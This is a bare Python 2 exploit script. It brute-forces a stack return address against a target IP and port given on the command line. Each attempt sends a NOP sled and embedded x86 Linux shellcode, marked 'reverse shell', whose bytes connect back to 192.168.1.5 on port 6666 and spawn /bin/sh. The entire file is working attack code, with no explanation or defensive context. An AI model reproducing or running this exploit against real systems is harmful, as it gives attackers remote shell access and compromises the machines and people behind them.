from socket import *
import sys, os


#reverse shell
buf = \
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd" +\
"\x80\x5b\x5e\x68\xc0\xa8\x01\x05\x66\x68\x1a\x0a\x66\x53" +\
"\x6a\x10\x51\x50\x89\xe1\x43\x6a\x66\x58\xcd\x80\x59\x87" +\
"\xd9\xb0\x3f\xcd\x80\x49\x79\xf9\x50\x68\x2f\x2f\x73\x68" +\
"\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd" +\
"\x80"

IP = sys.argv[1]
PORT = sys.argv[2]
PORT = int(PORT)

for i in range(0xff, 0x00, -1):
        for j in range(0x01, 0x100, 10):
                print "Create Socket"

                sock = socket(AF_INET, SOCK_STREAM)

                payload = ""
                payload += "\x90"*44
                payload += chr(j) + chr(i) + "\xff\xbf"
                payload += "\x90"*100
                payload += buf

                print "[*] Connect",IP, PORT
                sock.connect((IP,PORT))

                sock.send(payload)
                #sock.recv(1024)
                sock.close()